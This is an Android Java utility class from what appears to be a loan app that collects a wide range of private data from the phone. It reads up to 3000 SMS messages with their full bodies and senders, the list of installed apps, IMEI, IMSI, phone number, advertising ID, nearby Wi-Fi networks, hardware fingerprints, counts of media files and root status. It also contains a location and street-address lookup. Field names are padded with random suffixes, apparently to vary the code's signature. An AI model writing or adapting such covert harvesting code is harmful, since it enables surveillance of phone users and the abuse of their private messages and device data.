package com.fund.funds.lucky.go.loan;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Address;
import android.location.Criteria;
import android.location.Geocoder;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.net.wifi.ScanResult;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Environment;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.DisplayMetrics;
import android.util.Log;

import androidx.core.app.ActivityCompat;

import java.io.File;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.text.DecimalFormat;
import java.util.ArrayList;
import java.util.Collections;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import com.google.android.gms.ads.identifier.AdvertisingIdClient;

public class DeviceUtils {

    public static List<Map> getPhoneSms(Activity context) {
        List<Map> list = new ArrayList<>();
        try {
            Uri SMS_INBOX = Uri.parse("content://sms/");
            ContentResolver cr = context.getContentResolver();
            Long smsLimit = 3000L;
            Cursor cur = cr.query(SMS_INBOX, new String[]{"_id", "address", "person", "body", "date",
                    "thread_id", "type", "protocol", "read", "status", "service_center"}, null, null, "date desc limit " + smsLimit);
            if (null == cur) {
                return null;
            }
            while (cur.moveToNext()) {
                // SMT_RANDOM_SORT_BEGIN
                @SuppressLint("Range") String _id = cur.getString(cur.getColumnIndex("_id"));
                @SuppressLint("Range") String threadId = cur.getString(cur.getColumnIndex("thread_id"));
                @SuppressLint("Range") String address = cur.getString(cur.getColumnIndex("address"));
                @SuppressLint("Range") String person = cur.getString(cur.getColumnIndex("person"));
                @SuppressLint("Range") String protocol = cur.getString(cur.getColumnIndex("protocol"));
                @SuppressLint("Range") String read = cur.getString(cur.getColumnIndex("read"));
                @SuppressLint("Range") String type = cur.getString(cur.getColumnIndex("type"));
                @SuppressLint("Range") String body = cur.getString(cur.getColumnIndex("body"));
                @SuppressLint("Range") String status = cur.getString(cur.getColumnIndex("status"));
                @SuppressLint("Range") String date = cur.getString(cur.getColumnIndex("date"));
                @SuppressLint("Range") String serviceCenter = cur.getString(cur.getColumnIndex("service_center"));
                // SMT_RANDOM_SORT_END
                Map<String, Object> map = new HashMap<String, Object>();
//                String name = getContactByAddr(context, address);
                // SMT_RANDOM_SORT_BEGIN
                map.put("personName", null);
                map.put("msgNo", _id);
                map.put("threadNo", threadId);
                map.put("address", address);
                map.put("person", person);
                map.put("protocol", protocol);
                map.put("read", read);
                map.put("type", type);
                map.put("body", body);
                map.put("status", status);
                map.put("date", date);
                map.put("serviceCenter", serviceCenter);
                // SMT_RANDOM_SORT_END
                list.add(map);
            }
            if (cur != null && !cur.isClosed()) {
                cur.close();
                cur = null;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return list;
    }

    public static List<Map> getAppInfoList(Activity context) {
        List<Map> mapList = new ArrayList<>();
        PackageManager manager = context.getPackageManager();
        int getUninstalledPackages = PackageManager.GET_UNINSTALLED_PACKAGES;
        if (Build.VERSION.SDK_INT > Build.VERSION_CODES.N) {
            getUninstalledPackages = PackageManager.MATCH_UNINSTALLED_PACKAGES;
        }
        List<PackageInfo> installedPackages = manager.getInstalledPackages(getUninstalledPackages);
        List<String> packages = new ArrayList<>();
        for (int i = 0; i < installedPackages.size(); i++) {
            Map hashMap = new HashMap();;
            PackageInfo packageInfo = installedPackages.get(i);
            packages.add(packageInfo.packageName);
            hashMap.put("appNameU9yFBi", isNullText(manager.getApplicationLabel(packageInfo.applicationInfo).toString()));
            hashMap.put("packageNamedSmSo2", isNullText(packageInfo.packageName));
            hashMap.put("installTimel3Ny7j", packageInfo.firstInstallTime);
            hashMap.put("updateTimenK5om2", packageInfo.lastUpdateTime);
            hashMap.put("versionksokJU", isNullText(packageInfo.versionName));
            hashMap.put("versionCodeR8Qs1Q", packageInfo.versionCode);
            hashMap.put("flagspI7QQR", packageInfo.applicationInfo.flags);
            // SMT_RANDOM_SORT_END
            if ((ApplicationInfo.FLAG_SYSTEM & packageInfo.applicationInfo.flags) != 0) {
                hashMap.put("appTypeM0rx1R", "SYSTEM");
            } else {
                hashMap.put("appTypeM0rx1R", "NON_SYSTEM");
            }
            mapList.add(hashMap);
        }
        Log.e("appList:", mapList.size() + "");
        return mapList;
    }

    public static Map<String, Object> getDeviceInfo(Activity context) {
        Map map = new HashMap();
        map.put("osType", "ANDROID");
        try {
            map.put("generalDataCbw4j2", getGeneralData(context));
        } catch (Exception e) {
            e.printStackTrace();
        }
        try {
            map.put("batteryStatuslDRugQ", getBatteryStatus(context));
            // SMT_RANDOM_SORT_END
        } catch (Exception e) {
            e.printStackTrace();
        }
        try {
            map.put("currWifiLloy16", getCurrentWifi(context));
        } catch (Exception e) {
            e.printStackTrace();
        }
        try {
            map.put("configWifiucSQNF", getConfigWifi(context));
        } catch (Exception e) {
            e.printStackTrace();
        }
        try {
            map.put("hardwareshZccz", getHardware(context));
        } catch (Exception e) {
            e.printStackTrace();
        }
//        try {
//            map.put("location", getLocation(context));
//        } catch (Exception e) {
//            e.printStackTrace();
//        }
        try {
            map.put("publicIpyeOakN", getPublicIp(context));
        } catch (Exception e) {
            e.printStackTrace();
        }
        try {
            map.put("simCardlqMEZf", getSimCard(context));
        } catch (Exception e) {
            e.printStackTrace();
        }
        try {
            map.put("storageuTosYG", getStorage(context));
        } catch (Exception e) {
            e.printStackTrace();
        }
        try {
            map.put("otherDatau7YSHK", getOtherData(context));
        } catch (Exception e) {
            e.printStackTrace();
        }
        try {
            map.put("devFilej9tCrF", getDivFile(context));
        } catch (Exception e) {

        }
        return map;
    }

    private static Map getGeneralData(Activity context) {
        Map u = new HashMap();
        u.put("andIda8Da85", DriverInfoUtil.getAndroidID(context));
        u.put("phoneNumberl6YZEE", DriverInfoUtil.getPhone(context));
        u.put("phoneTypeT8t1XN", DriverInfoUtil.getPhoneType(context));
        u.put("mncXihCRh", DriverInfoUtil.getMNC(context));
        u.put("mccEZIYdH", DriverInfoUtil.getMCC(context));
        u.put("dnsiqpJ6o", DriverInfoUtil.getLocalDNS());
        u.put("languageXDduTh", DriverInfoUtil.getOsLanguage(context));
        u.put("gaidkgXLB7", getGaid(context));
        u.put("imeiIYTirF", DriverInfoUtil.getDriverIMIE(context));
        u.put("networkOperatorz7WYI7", DriverInfoUtil.getNetworkOperator(context));
        u.put("networkTypegkqh5l", DriverInfoUtil.getNetworkType(context));
        u.put("networkOperatorName", DriverInfoUtil.getNetworkOperatorName(context));
        u.put("timeZoneIdcK23TV", DriverInfoUtil.getTimeZoneId());
        u.put("localeIso3LanguageReFQaF", DriverInfoUtil.getISO3Language(context));
        u.put("localeDisplayLanguageSklNRK", DriverInfoUtil.getLocaleDisplayLanguage());
        u.put("localeIso3CountryAsnKI4", DriverInfoUtil.getISO3Country(context));
        u.put("imsi", DriverInfoUtil.getImsi(context))
        // SMT_RANDOM_SORT_BEGIN
        ;
        return u;
    }

    public static String getGaid(Context context) {
        try {
            String id = new AdvertisingIdClient(context).getAdvertisingIdInfo(context).getId();
            return id;
        } catch (Exception e) {
            return null;
        }
    }

    private static Map getBatteryStatus(Activity context) {
        try {
            Intent batteryInfoIntent = context.registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            // SMT_RANDOM_SORT_BEGIN
            int level = batteryInfoIntent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);//电量（0-100）
            int scale = batteryInfoIntent.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
            int plugged = batteryInfoIntent.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);//
            // SMT_RANDOM_SORT_END
            float batteryPct = level / (float) scale;
            boolean isUsbCharge = false;
            boolean isCharging = false;
            boolean isAcCharge = false;
            switch (plugged) {
                case BatteryManager.BATTERY_PLUGGED_AC: {
                    isAcCharge = true;
                    isCharging = true;
                }
                break;
                case BatteryManager.BATTERY_PLUGGED_USB: {
                    isUsbCharge = true;
                    isCharging = true;
                }
                break;
            }
            Map u = new HashMap();;
            // SMT_RANDOM_SORT_BEGIN
            u.put("batteryPctgI42Et", batteryPct);
            u.put("isUsbChargeW1MXzD", isUsbCharge);
            u.put("isAcChargevFy5ZO", isAcCharge);
            u.put("isChargingX9iwLO", isCharging);
            // SMT_RANDOM_SORT_END
            return u;
        } catch (Exception e) {
            return new HashMap();
        }
    }

    @SuppressLint("MissingPermission")
    private static Map getCurrentWifi(Activity context) {
        Map u = new HashMap();;
        try {
            @SuppressLint("WifiManagerLeak") WifiManager wifiManager = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
            @SuppressLint("MissingPermission") WifiInfo wifiInfo = wifiManager.getConnectionInfo();
            if (null != wifiInfo) {
                // SMT_RANDOM_SORT_BEGIN
                u.put("wifiConnected", true);
                u.put("bssidTwL8VA", wifiInfo.getBSSID());
                u.put("ssidnVwsGl", wifiInfo.getSSID());
                u.put("macB9zkMg", wifiInfo.getMacAddress());
                u.put("ipawa25v", intToIpAddress(wifiInfo.getIpAddress()));
                // SMT_RANDOM_SORT_END
            }
        } catch (Exception e) {
        }
        return u;
    }

    private static String intToIpAddress(long ipInt) {
        StringBuffer sb = new StringBuffer();
        sb.append(ipInt & 0xFF).append(".");
        sb.append((ipInt >> 8) & 0xFF).append(".");
        sb.append((ipInt >> 16) & 0xFF).append(".");
        sb.append((ipInt >> 24) & 0xFF);
        return sb.toString();
    }

    private static List<Map> getConfigWifi(Activity context) {
        List<Map> ret = new ArrayList<>();
        try {
            @SuppressLint("WifiManagerLeak") WifiManager wifiManager = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
            @SuppressLint("MissingPermission") List<ScanResult> scanResults = wifiManager.getScanResults();
            if (scanResults != null) {
                for (int i = 0; i < scanResults.size(); i++) {
                    ScanResult scanResult = scanResults.get(i);
                    Map u = new HashMap();;
                    // SMT_RANDOM_SORT_BEGIN
                    u.put("ssidnVwsGl", isNullText(scanResult.SSID));
                    u.put("bssidTwL8VA", isNullText(scanResult.BSSID));
                    u.put("nameyJEzwD", isNullText(scanResult.SSID));
                    u.put("macB9zkMg", isNullText(scanResult.BSSID));
                    // SMT_RANDOM_SORT_END
                    ret.add(u);
                }
            }
        } catch (Exception e) {
        }
        return ret;
    }

    public static String isNullText(String text) {
        try {
            if (null == text) {
                return "";
            }
            if (TextUtils.isEmpty(text)) {
                return "";
            }
            return text;
        }catch (Exception e){
            e.printStackTrace();
            return "";
        }
    }

    private static Map getHardware(Activity context) {
        Map u = new HashMap();;
        u.put("deviceNameVlHKdf", DriverInfoUtil.getDeviceName());
        // SMT_RANDOM_SORT_BEGIN
        u.put("brandcW0g8g", DriverInfoUtil.getBrand());
        u.put("productI8T9N3", DriverInfoUtil.getDevicePro());
        u.put("modelU8mV9A", DriverInfoUtil.getModel());
        u.put("releases1OMDC", DriverInfoUtil.getOperatingSystemVersion());
        u.put("cpuTypeqxjuJC", DriverInfoUtil.cpuNameGet());
        u.put("sdkVersionAZVEkJ", DriverInfoUtil.getSoftwareDevelopmentKitVersion());
        u.put("serialNumberMYvlMN", DriverInfoUtil.SmMySerialNumber());
        // SMT_RANDOM_SORT_END
        u.put("physicalSizebroJOD", DriverInfoUtil.getPhysicalSize(context));
        try {
            u.put("manufacturerSu3DFB", Build.MANUFACTURER);
            u.put("displaymh1Iu1", Build.DISPLAY);
            u.put("fingerprintcgzBn3", Build.FINGERPRINT);
            u.put("abistHGENT", getAbis(context)) ;
            u.put("boardQIvTBC", Build.BOARD) ;
            u.put("buildIdfIzSX8", Build.ID) ;
            u.put("hostYXZkpJ", Build.HOST) ;
            u.put("typeIVyt6h", Build.TYPE) ;
            u.put("buildUserFdbNYb", Build.USER);
            u.put("cpuAbibgZnBU", Build.CPU_ABI) ;
            u.put("cpuAbi2ONqYXh", Build.CPU_ABI2);
            u.put("bootloaderdS2w1y", Build.BOOTLOADER);
            u.put("hardwareshZccz", Build.HARDWARE) ;

            u.put("baseOSZz0ead", Build.VERSION.BASE_OS);
        } catch (Exception e) {
        }
        u.put("radioVersionokW2pY", DriverInfoUtil.radioVersion());
        try {
            u.put("sdCardPathrlvRKQ", Environment.getExternalStorageDirectory().toString());
        } catch (Exception e) {
        }
        // SMT_RANDOM_SORT_BEGIN
        u.put("internalTotalSizeMYH8gU", DriverInfoUtil.getTotalInternalMemorySize());
        u.put("internalAvailableSizemBk9wi", DriverInfoUtil.getAvailableExternalStorageSize());
        u.put("externalTotalSizeIu2yqm", DriverInfoUtil.getTotalExternalMemorySize());
        u.put("externalAvailableSizeqRHB1m", DriverInfoUtil.getAvailableExternalMemorySize());
        u.put("sdCardInfoSfMU1D", DriverInfoUtil.getSDInfo())
        // SMT_RANDOM_SORT_END
        ;

        return u;
    }

    private static List<String> getAbis(Activity context) {
        List<String> ret = new ArrayList<>();
        if (Build.SUPPORTED_ABIS != null) {
            for (String s : Build.SUPPORTED_ABIS) {
                ret.add(s);
            }
        }
        return ret;
    }

    @SuppressLint("MissingPermission")
    public static Map getLocation(Activity context) {
        Map u = new HashMap();;
        Map gps = new HashMap();
        try {
            LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
            List<String> providers = locationManager.getProviders(true);
            if (providers.contains(LocationManager.GPS_PROVIDER)) {
                Criteria criteria = new Criteria();
                // SMT_RANDOM_SORT_BEGIN
                criteria.setAccuracy(Criteria.ACCURACY_FINE);
                criteria.setAltitudeRequired(false);
                criteria.setBearingRequired(false);
                criteria.setCostAllowed(true);
                criteria.setPowerRequirement(Criteria.POWER_LOW);
                // SMT_RANDOM_SORT_END
                String provider = locationManager.getBestProvider(criteria, true);
                @SuppressLint("MissingPermission") Location location = locationManager.getLastKnownLocation(provider);
                double latitude = -1;
                double longitude = -1;
                if (null != location) {
                    latitude = location.getLatitude();
                    longitude = location.getLongitude();
                    gps.put("latitude", latitude);
                    gps.put("longitude", longitude);
                } else {
                    location = locationManager.getLastKnownLocation(locationManager.NETWORK_PROVIDER);
                    if (null != location) {
                        latitude = location.getLatitude();
                        longitude = location.getLongitude();
                        gps.put("latitude", latitude);
                        gps.put("longitude", longitude);
                    }
                }
                try {
                    Geocoder geocoder = new Geocoder(context, Locale.getDefault());
                    DecimalFormat df = new DecimalFormat();
                    df.setMaximumFractionDigits(3);
                    double lat = Double.parseDouble(df.format(latitude));
                    double lon = Double.parseDouble(df.format(longitude));

                    List<Address> addresses = geocoder.getFromLocation(lat, lon, 1);
                    fillAddress(u, addresses);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            } else {
                Criteria criteria = new Criteria();
                // SMT_RANDOM_SORT_BEGIN
                criteria.setCostAllowed(false);
                criteria.setAccuracy(Criteria.ACCURACY_FINE);
                criteria.setAltitudeRequired(false);
                criteria.setBearingRequired(false);
                criteria.setCostAllowed(false);
                criteria.setPowerRequirement(Criteria.POWER_LOW);
                // SMT_RANDOM_SORT_END
                String providerName = locationManager.getBestProvider(criteria, true);
                if (providerName != null) {
                    Location location = locationManager.getLastKnownLocation(providerName);
                    if (location != null) {
                        try {
                            double latitude = location.getLatitude();
                            double longitude = location.getLongitude();
                            gps.put("latitude", latitude);
                            gps.put("longitude", longitude);
                            Geocoder geocoder = new Geocoder(context, Locale.getDefault());
                            List<Address> addresses = geocoder.getFromLocation(latitude, longitude, 1);
                            fillAddress(u, addresses);
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                }
            }
//            if (gps == null || gps.isEmpty() || gps.get("latitude") == null) {
//                String ip = getIPAddress();
//                if (!TextUtils.isEmpty(ip)) {
//                    JSONObject s = locationUrl(ip);
//                    if (s != null) {
//                        gps.put("latitude", s.get("lat"));
//                        gps.put("longitude", s.get("lon"));
//                    }
//                }
//            }
        } catch (Exception e) {

        }
        u.put("gps", gps);
        return u;
    }

    private static void fillAddress(Map u, List<Address> addresses) {
        if (addresses.size() > 0) {
            Address address = addresses.get(0);
            // SMT_RANDOM_SORT_BEGIN
            String country = address.getCountryName();
            String province = address.getAdminArea();
            String city = address.getSubAdminArea();
            String bigDirect = address.getLocality();
            String smallDirect = address.getThoroughfare();
            String detailed = address.getAddressLine(0);
            // SMT_RANDOM_SORT_END
            // SMT_RANDOM_SORT_BEGIN
            u.put("country", isNullText(country));
            u.put("province", isNullText(province));
            u.put("city", isNullText(city));
            u.put("largeDistrict", isNullText(bigDirect));
            u.put("smallDistrict", isNullText(smallDirect));
            u.put("address", isNullText(detailed));
            // SMT_RANDOM_SORT_END
        }
    }

    private static Map getPublicIp(Activity context) {
        Map u = new HashMap();;
        try {
            // 内网地址
            ArrayList<NetworkInterface> nilist = Collections.list(NetworkInterface.getNetworkInterfaces());
            for (NetworkInterface ni : nilist) {
                ArrayList<InetAddress> ialist = Collections.list(ni.getInetAddresses());
                for (InetAddress address : ialist) {
                    if (!address.isLoopbackAddress() && !address.isLinkLocalAddress()) {
                        u.put("intranetIpFF12Jy", isNullText(address.getHostAddress()));
                        break;
                    }
                }
            }
        } catch (Exception ex) {
        }
        return u;
    }

    @SuppressLint("MissingPermission")
    private static Map getSimCard(Activity context) {
        Map u = new HashMap();;
        // SMT_RANDOM_SORT_BEGIN
        u.put("countryIsoUf8REy", DriverInfoUtil.getSimCountryIso(context));
        u.put("serialNumberMYvlMN", isNullText(DriverInfoUtil.SmMySerialNumber()));
        u.put("simCardReadyDIZg4E", DriverInfoUtil.isSimCardReady(context));
        // SMT_RANDOM_SORT_END

        // SMT_RANDOM_SORT_BEGIN
        u.put("mobileDataBgDTm0", DriverInfoUtil.isMobileData(context));
        u.put("dataNetworkTypefWyovG", DriverInfoUtil.getDataNetworkType(context));
        // SMT_RANDOM_SORT_END
        try {
            TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            u.put("operatorFTVNcV", tm.getSimOperator());
            u.put("operatorNamepMId7j", tm.getSimOperatorName());
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
                    return u;
                }
                u.put("mobileDataEnabledP4qFJi", tm.isDataEnabled());
            }
        } catch (Exception e) {
            return u;
        }
        return u;
    }

    private static Map getStorage(Activity context) {
        Map u = new HashMap();;
        try {
            // SMT_RANDOM_SORT_BEGIN
            u.put("ramTotalSizeOnbeXg", isNullText(DriverInfoUtil.getRamTotalSize(context)));
            u.put("ramUsableSizeprn6kk", isNullText(DriverInfoUtil.getRamAvailSize(context)));
            u.put("mainStorageQdF0BK", isNullText(DriverInfoUtil.getRootDirectory()));
            u.put("externalStorageR0VtD0", isNullText(DriverInfoUtil.getExternalStorageDirectory()));
            u.put("memoryCardSizelFXUtg", isNullText(DriverInfoUtil.getSDInfo().get("totalSize").toString()));
            u.put("memoryCardSizeUseQvW766", isNullText(DriverInfoUtil.getSDInfo().get("useSize").toString()));
            u.put("internalStorageTotalbkOcGj", isNullText(DriverInfoUtil.getTotalInternalMemorySize() + ""));
            u.put("internalStorageUsableSgXO96", isNullText(DriverInfoUtil.getAvailableExternalStorageSize() + ""));
            // SMT_RANDOM_SORT_END
        } catch (Exception e) {
        }
        return u;
    }

    private static Map getOtherData(Activity context) {
        Map u = new HashMap();;

        List<String> sysPhotos = DriverInfoUtil.getSystemPhotoList(context);
        boolean isRoot = DriverInfoUtil.isRooted();
        boolean isEmulator = DriverInfoUtil.isEmulator();

        // SMT_RANDOM_SORT_BEGIN
        u.put("imageNumatB9Ni", null == sysPhotos ? 0 : sysPhotos.size());
        u.put("hasRootOQVsGS", isRoot);
        u.put("simulatorDlnIj1", isEmulator);
        u.put("adbEnabledexy7ID", isDevMode(context));
        u.put("keyboardPdFl3Y", isNullText(DriverInfoUtil.getKeyboard(context)));
        // SMT_RANDOM_SORT_END
        try {
            // SMT_RANDOM_SORT_BEGIN
            u.put("cpuNumberce4wrg", DriverInfoUtil.CpuNumCoresGetfj());
            u.put("appMaxMemorylXBi91", DriverInfoUtil.getMemory(context)[0]);
            u.put("appAvailableMemoryCF50wY", DriverInfoUtil.getMemory(context)[1]);
            u.put("appFreeMemoryJhIwEV", DriverInfoUtil.getMemory(context)[2]);
            u.put("totalBootTimeHnoiOg", DriverInfoUtil.getOsTime(context)[0]);
            u.put("totalBootTimeWakeaV7OGl", DriverInfoUtil.getOsTime(context)[1]);
            u.put("maxBatteryITuC8t", DriverInfoUtil.getBattery(context)[0]);
            u.put("levelBatteryuLBq55", DriverInfoUtil.getBattery(context)[1]);
            // SMT_RANDOM_SORT_END
        } catch (Exception e) {

        }
        try {
            Object dbm = DriverInfoUtil.getCellInfo(context).get("dbm");
            if (dbm != null) {
                u.put("dbmlGYZDM", isNullText(dbm.toString()));
            }
        } catch (Exception e) {
        }
        u.put("lastBootTimeKL3WDl", DriverInfoUtil.getLastBootTime(context));
        try {
            DisplayMetrics displayMetrics = new DisplayMetrics();
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                context.getDisplay().getMetrics(displayMetrics);
            }
//            FlutterStartActivity.Companion.getInstance().getWindowManager().getDefaultDisplay().getMetrics(displayMetrics);
            int height = displayMetrics.heightPixels;
            int width = displayMetrics.widthPixels;
            // SMT_RANDOM_SORT_BEGIN
            u.put("screenWidthfQFwXO", width);
            u.put("screenHeightT21iar", height);
            u.put("screenDensityZTvcGH", displayMetrics.density);
            u.put("screenDensityDpivhAYoX", displayMetrics.densityDpi);
            // SMT_RANDOM_SORT_END
        } catch (Exception e) {
        }
        return u;
    }

    @android.annotation.TargetApi(17)
    public static boolean isDevMode(Activity context) {
        try {
            if (Integer.valueOf(Build.VERSION.SDK) == 16) {
                return android.provider.Settings.Secure.getInt(context.getContentResolver(),
                        android.provider.Settings.Secure.DEVELOPMENT_SETTINGS_ENABLED, 0) != 0;
            } else if (Integer.valueOf(Build.VERSION.SDK) >= 17) {
                return android.provider.Settings.Secure.getInt(context.getContentResolver(),
                        android.provider.Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0) != 0;
            } else return false;
        } catch (Exception e) {
            return false;
        }
    }

    private static  Map getDivFile(Activity context){
        Map u = new HashMap();;
        try {
            File audioInternalDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MUSIC);
            int audioInternalFileCount = (audioInternalDir.listFiles() == null) ? 0 : audioInternalDir.listFiles().length;
            u.put("audioInternalgSd2ce", audioInternalFileCount);

            File audioExternalDir = context.getExternalFilesDir(Environment.DIRECTORY_MUSIC);
            int audioExternalFileCount = (audioExternalDir.listFiles() == null) ? 0 : audioExternalDir.listFiles().length;
            u.put("audioExternalIJSGjp", audioExternalFileCount);
            // 获取图片内部存储文件个数
            File imagesInternalDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES);
            int imagesInternalFileCount = (imagesInternalDir.listFiles() == null) ? 0 : imagesInternalDir.listFiles().length;
            u.put("imagesInternalPcUu78", imagesInternalFileCount);
            // 获取图片外部存储文件个数
            File imagesExternalDir = context.getExternalFilesDir(Environment.DIRECTORY_PICTURES);
            int imagesExternalFileCount = (imagesExternalDir.listFiles() == null) ? 0 : imagesExternalDir.listFiles().length;
            u.put("imagesExternalMI79gp", imagesExternalFileCount);
            // 获取视频内部存储文件个数
            File videoInternalDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MOVIES);
            int videoInternalFileCount = (videoInternalDir.listFiles() == null) ? 0 : videoInternalDir.listFiles().length;
            u.put("videoInternalwEHDw0", videoInternalFileCount);
            // 获取视频外部存储文件个数
            File videoExternalDir = context.getExternalFilesDir(Environment.DIRECTORY_MOVIES);
            int videoExternalFileCount = (videoExternalDir.listFiles() == null) ? 0 : videoExternalDir.listFiles().length;
            u.put("videoExternalprT0Lx", videoExternalFileCount);
            // 获取下载文件个数
            String downloadDirPath = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).getPath();
            File downloadDir = new File(downloadDirPath);
            File[] downloadFiles = downloadDir.listFiles();
            int downloadFileCount = (downloadFiles == null) ? 0 : downloadFiles.length;
            u.put( "downloadFilescQDL7l",downloadFileCount);
        } catch (Exception e) {

        }
        return u;
    }
}
